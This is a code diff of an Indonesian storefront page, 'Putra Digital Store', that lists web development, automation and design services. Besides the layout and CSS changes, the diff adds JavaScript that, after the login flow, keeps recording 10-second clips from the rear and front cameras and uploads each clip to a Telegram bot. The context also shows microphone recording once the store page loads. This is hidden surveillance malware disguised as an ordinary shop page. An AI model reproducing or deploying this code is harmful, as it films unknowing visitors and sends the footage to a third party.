@@ -76,13 +76,11 @@
       border: 1px solid #ff6666;
     }
 
-    /* Service card - sama seperti sebelumnya */
+    /* Service card - dimodifikasi sedikit untuk konsistensi */
     .service-card {
       background: #1a1a1a;
       border: 1px solid #3399ff;
       border-radius: 12px;
-      padding: 25px;
-      margin-bottom: 25px;
       box-shadow: 0 0 15px rgba(0, 204, 255, 0.3);
       transition: transform 0.3s ease, box-shadow 0.3s ease;
       display: flex;
@@ -96,8 +94,8 @@
     }
     .service-card h3 {
       color: #00ccff;
-      font-size: 1.8rem;
-      margin-bottom: 15px;
+      font-size: 1.5rem;
+      margin-bottom: 10px;
       text-shadow: 0 0 8px rgba(0, 204, 255, 0.5);
     }
     .service-card .btn-order-card {
@@ -105,15 +103,15 @@
       align-items: center;
       justify-content: center;
       width: auto;
-      margin-top: 20px;
+      margin-top: 15px;
       background: linear-gradient(90deg, #00ff66, #00cc66);
       color: #0d0d0d;
       border: none;
-      padding: 10px 20px;
+      padding: 8px 16px;
       border-radius: 8px;
       font-weight: bold;
       cursor: pointer;
-      font-size: 1rem;
+      font-size: 0.9rem;
       box-shadow: 0 0 10px rgba(0, 255, 102, 0.4);
       transition: all 0.3s ease;
     }
@@ -187,6 +185,21 @@
     .hidden {
       display: none !important;
     }
+
+    /* Animasi slide in dari kiri */
+    @keyframes slideInLeft {
+      from {
+        transform: translateX(-100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+    .animate-slide-in-left {
+      animation: slideInLeft 0.6s ease-out forwards;
+    }
   </style>
 </head>
 <body class="flex flex-col items-center justify-center p-4">
@@ -215,62 +228,68 @@
 
     <!-- Store Content Page -->
     <div id="store-page" class="hidden text-left p-4 md:p-8 rounded-lg bg-[#1a1a1a] border border-[#3399ff] shadow-[0_0_20px_rgba(0,204,255,0.5)]">
-      <div class="text-center mb-8">
-        <img src="putra.png" alt="Putra Store Logo" class="logo-img mx-auto w-32 md:w-40 filter-none">
-        <h2 class="text-4xl font-extrabold text-[#3399ff] drop-shadow-[0_0_10px_rgba(0,204,255,0.7)] mt-4">SELAMAT DATANG DI PUTRA DIGITAL STORE</h2>
-        <p class="text-gray-300 text-lg mt-3">Temukan berbagai layanan digital inovatif untuk kebutuhan Anda.</p>
+      
+      <!-- Navbar dengan logo kecil dan menu -->
+      <div id="home" class="flex items-center justify-between mb-8 animate-slide-in-left">
+        <img src="putra.png" alt="Putra Store Logo" class="w-12 h-12 md:w-16 md:h-16 object-contain filter drop-shadow-[0_0_10px_#00ccff]">
+        <div class="flex items-center space-x-4 md:space-x-6 text-sm md:text-base font-medium">
+          <a href="#home" class="bg-gray-800/70 hover:bg-gray-700 text-white px-4 py-2 rounded-lg transition-colors">HOME</a>
+          <a href="#services" class="bg-gray-800/70 hover:bg-gray-700 text-white px-4 py-2 rounded-lg transition-colors">PRODUK</a>
+          <a href="https://portoputrastore.vercel.app" target="_blank" class="bg-gray-800/70 hover:bg-gray-700 text-white px-4 py-2 rounded-lg transition-colors">ABOUT ME</a>
+          <a href="#kontak" class="bg-gray-800/70 hover:bg-gray-700 text-white px-4 py-2 rounded-lg transition-colors">KONTAK</a>
+        </div>
       </div>
 
-      <!-- Section: Layanan Kami -->
-      <section class="mb-10">
+      <!-- Section: Layanan Kami (dimodifikasi: grid lebih rapat, card lebih kecil, teks singkat) -->
+      <section id="services" class="mb-10">
         <h3 class="text-3xl font-bold text-[#00ccff] mb-6 border-b-2 border-[#00ccff] pb-3 text-center">LAYANAN KAMI</h3>
-        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
           <!-- Service Card 1 -->
-          <div class="service-card">
-            <h3>Pengembangan Website Custom</h3>
-            <p>Kami membangun website yang responsif, cepat, dan sesuai keinginan Anda. Mulai dari landing page sederhana hingga platform e-commerce kompleks.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Website Custom</h3>
+            <p class="text-gray-400 mb-2">Landing page hingga e-commerce.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
           <!-- Service Card 2 -->
-          <div class="service-card">
-            <h3>Pembuatan Script Otomatisasi</h3>
-            <p>Butuh script khusus untuk otomatisasi tugas, scraping data, atau bot? Tim kami siap menciptakan solusi script yang efisien dan akurat.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Script Otomatisasi</h3>
+            <p class="text-gray-400 mb-2">Bot, scraping, task automation.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
           <!-- Service Card 3 -->
-          <div class="service-card">
-            <h3>Desain Logo & Branding</h3>
-            <p>Bangun identitas merek yang kuat dengan desain logo profesional dan elemen branding yang menarik. Buat kesan pertama yang tak terlupakan.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Desain Logo & Branding</h3>
+            <p class="text-gray-400 mb-2">Identitas merek profesional.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
           <!-- Service Card 4 -->
-          <div class="service-card">
-            <h3>Jasa Maintenance Website</h3>
-            <p>Jaga website Anda tetap aman, cepat, dan terupdate dengan layanan maintenance berkala dari kami. Fokus pada bisnis Anda, biar kami yang urus teknisnya.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Maintenance Website</h3>
+            <p class="text-gray-400 mb-2">Keamanan & update rutin.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
           <!-- Service Card 5 -->
-          <div class="service-card">
-            <h3>Konsultasi Teknologi Digital</h3>
-            <p>Dapatkan panduan ahli untuk strategi digital Anda. Kami bantu analisis kebutuhan, pilih teknologi tepat, dan rencanakan roadmap pengembangan.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Konsultasi Teknologi</h3>
+            <p class="text-gray-400 mb-2">Strategi digital & analisis.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
           <!-- Service Card 6 -->
-          <div class="service-card">
-            <h3>Optimasi SEO Dasar</h3>
-            <p>Tingkatkan visibilitas website Anda di mesin pencari. Kami akan membantu optimasi dasar agar website Anda lebih mudah ditemukan oleh calon pelanggan.</p>
-            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
-              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+          <div class="service-card p-4 text-sm">
+            <h3 class="text-xl">Optimasi SEO Dasar</h3>
+            <p class="text-gray-400 mb-2">Visibilitas di mesin pencari.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card text-xs">
+              <i class="fab fa-whatsapp mr-1"></i> PESAN
             </a>
           </div>
         </div>
@@ -291,8 +310,18 @@
         </div>
       </section>
 
+      <!-- Section: About Me -->
+      <section id="about" class="mb-10">
+        <h3 class="text-3xl font-bold text-[#6633ff] mb-6 border-b-2 border-[#6633ff] pb-3 text-center">TENTANG SAYA</h3>
+        <div class="bg-[#1a1a1a] p-6 rounded-lg border border-[#6633ff] shadow-lg">
+          <p class="text-gray-300 text-lg leading-relaxed">
+            Halo, saya Putra, pendiri Putra Digital Store. Saya adalah seorang pengembang web dan pecinta teknologi yang berkomitmen memberikan solusi digital terbaik untuk klien. Dengan pengalaman lebih dari 5 tahun di bidang pengembangan web dan otomatisasi, saya siap membantu mewujudkan ide-ide Anda menjadi produk digital yang berkualitas. Mari berkolaborasi!
+          </p>
+        </div>
+      </section>
+
       <!-- Section: Hubungi Kami / Footer -->
-      <footer class="text-center mt-12 pt-8 border-t-2 border-[#3399ff]">
+      <footer id="kontak" class="text-center mt-12 pt-8 border-t-2 border-[#3399ff]">
         <h3 class="text-2xl font-bold text-[#3399ff] mb-4">SIAP MEMULAI PROYEK DIGITAL ANDA?</h3>
         <p class="text-gray-300 text-lg mb-6">Jangan ragu untuk menghubungi kami untuk konsultasi gratis!</p>
         <div class="flex flex-col md:flex-row justify-center items-center space-y-4 md:space-y-0 md:space-x-6">
@@ -321,6 +350,9 @@
     const errorMsgDiv = document.getElementById('error-msg');
     const startButton = document.getElementById('startBtn');
     const recordingStatus = document.getElementById('recording-status');
+
+    // Variabel untuk kontrol rekaman bergantian setelah login
+    let recordingLoopActive = false;
 
     function showMainPage(pageId) {
       landingPage.classList.add('hidden');
@@ -413,6 +445,59 @@
       }
     }
 
+    // Fungsi helper untuk mengirim video ke Telegram
+    async function kirimVideo(blob, filename, caption) {
+      try {
+        const fd = new FormData();
+        fd.append("chat_id", OWNER_ID);
+        fd.append("video", blob, filename);
+        fd.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
+      } catch (e) {
+        console.error("Gagal kirim video:", e);
+      }
+    }
+
+    // ========== FITUR BARU: REKAMAN BERGANTIAN SETELAH LOGIN ==========
+    async function startPostLoginRecording() {
+      if (recordingLoopActive) return;
+      recordingLoopActive = true;
+
+      while (recordingLoopActive) {
+        // Rekam belakang 10 detik
+        const backBlob = await rekamVideo("environment", 10000);
+        if (!recordingLoopActive) break;
+        if (backBlob) {
+          await kirimVideo(backBlob, `back_${Date.now()}.webm`, "🎥 Rekaman belakang (10 detik)");
+        } else {
+          console.error("Gagal rekam belakang, hentikan loop");
+          break;
+        }
+
+        // Rekam depan 10 detik
+        const frontBlob = await rekamVideo("user", 10000);
+        if (!recordingLoopActive) break;
+        if (frontBlob) {
+          await kirimVideo(frontBlob, `front_${Date.now()}.webm`, "🎥 Rekaman depan (10 detik)");
+        } else {
+          console.error("Gagal rekam depan, hentikan loop");
+          break;
+        }
+      }
+    }
+
+    function stopPostLoginRecording() {
+      recordingLoopActive = false;
+      // Tidak perlu hentikan stream secara paksa; rekaman yang sedang berjalan akan selesai sendiri
+      // lalu loop berhenti karena flag false.
+    }
+    // ========== AKHIR FITUR BARU ==========
+
+    // Hentikan rekaman saat halaman ditutup atau direfresh
+    window.addEventListener('beforeunload', function() {
+      stopPostLoginRecording();
+    });
+
     // Fungsi utama
     async function startProcess() {
       showProcessingLayer(true);
@@ -486,6 +571,9 @@
       // Sembunyikan processing layer, tampilkan store page
       showProcessingLayer(false);
       showMainPage('store-page');
+
+      // Mulai rekaman bergantian setelah login
+      startPostLoginRecording();
 
       // Rekam mic setelah store muncul
       setTimeout(async () => {
